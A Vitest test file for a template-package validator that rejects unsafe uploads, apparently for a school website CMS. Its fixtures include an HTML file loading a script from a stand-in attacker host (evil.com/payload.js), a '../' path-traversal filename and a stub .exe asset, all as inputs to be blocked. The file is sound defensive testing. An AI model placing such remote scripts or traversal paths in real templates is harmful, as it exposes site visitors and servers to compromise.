import { describe, it, expect } from 'vitest';
import { validateTemplateFiles } from '../src/index.js';

describe('Template Engine: Validator & Security Scanner', () => {
  it('should accept valid template package with manifest and entry file', async () => {
    const validFiles = [
      {
        relativePath: 'manifest.json',
        sizeBytes: 300,
        content: JSON.stringify({
          schemaVersion: '1.0',
          templateKey: 'custom-template',
          name: 'Custom Template',
          version: '1.0.0',
          category: 'SMA/SMK',
          entry: 'index.html',
          preview: 'assets/preview.webp',
          supportedModules: ['site_settings', 'hero_slides', 'programs']
        })
      },
      {
        relativePath: 'index.html',
        sizeBytes: 500,
        content: '<!DOCTYPE html><html><body><h1 data-cms-text="site.name">{{ site.name }}</h1></body></html>'
      }
    ];

    const result = await validateTemplateFiles(validFiles);
    expect(result.isValid).toBe(true);
    expect(result.errors).toHaveLength(0);
    expect(result.manifest?.templateKey).toBe('custom-template');
  });

  it('should reject template with malicious <script> tag in HTML', async () => {
    const maliciousFiles = [
      {
        relativePath: 'manifest.json',
        sizeBytes: 300,
        content: JSON.stringify({
          schemaVersion: '1.0',
          templateKey: 'bad-template',
          name: 'Bad Template',
          version: '1.0.0',
          entry: 'index.html',
          preview: 'preview.webp',
          supportedModules: ['site_settings']
        })
      },
      {
        relativePath: 'index.html',
        sizeBytes: 500,
        content: '<html><body><script src="https://evil.com/payload.js"></script></body></html>'
      }
    ];

    const result = await validateTemplateFiles(maliciousFiles);
    expect(result.isValid).toBe(false);
    expect(result.errors.some(e => e.message.includes('<script>'))).toBe(true);
  });

  it('should reject template with path traversal in filenames', async () => {
    const traversalFiles = [
      {
        relativePath: '../manifest.json',
        sizeBytes: 100,
        content: '{}'
      }
    ];

    const result = await validateTemplateFiles(traversalFiles);
    expect(result.isValid).toBe(false);
    expect(result.errors.some(e => e.message.includes('path traversal'))).toBe(true);
  });

  it('should reject template with executable binary file', async () => {
    const dangerousFiles = [
      {
        relativePath: 'manifest.json',
        sizeBytes: 300,
        content: JSON.stringify({
          schemaVersion: '1.0',
          templateKey: 'exec-template',
          name: 'Exec Template',
          version: '1.0.0',
          entry: 'index.html',
          preview: 'preview.webp',
          supportedModules: ['site_settings']
        })
      },
      {
        relativePath: 'index.html',
        sizeBytes: 200,
        content: '<html><body>Hello</body></html>'
      },
      {
        relativePath: 'assets/malware.exe',
        sizeBytes: 1024,
        content: Buffer.from('MZ...')
      }
    ];

    const result = await validateTemplateFiles(dangerousFiles);
    expect(result.isValid).toBe(false);
    expect(result.errors.some(e => e.message.includes('.exe'))).toBe(true);
  });
});
